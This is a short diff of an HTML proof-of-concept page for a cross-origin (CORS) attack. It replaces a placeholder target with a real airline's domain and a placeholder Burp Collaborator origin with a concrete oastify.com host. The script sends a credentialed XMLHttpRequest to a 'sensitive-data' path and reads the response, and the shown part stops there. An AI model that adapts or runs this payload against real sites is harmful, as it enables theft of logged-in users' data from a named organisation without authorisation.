@@ -6,9 +6,9 @@
 <body>
     <script type="text/javascript">
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'http://target-vulnerable-site.com/sensitive-data', true);
+        xhr.open('GET', 'http://www.aeromexico.com/sensitive-data', true);
         xhr.withCredentials = true;
-        xhr.setRequestHeader('Origin', 'http://<your-collaborator-subdomain>.burpcollaborator.net');
+        xhr.setRequestHeader('Origin', 'http://d5jmq78i028olaywr0frsrt8rzxqlhe53.oastify.com');
         xhr.onreadystatechange = function() {
             if (xhr.readyState == 4 && xhr.status == 200) {
                 var data = xhr.responseText;
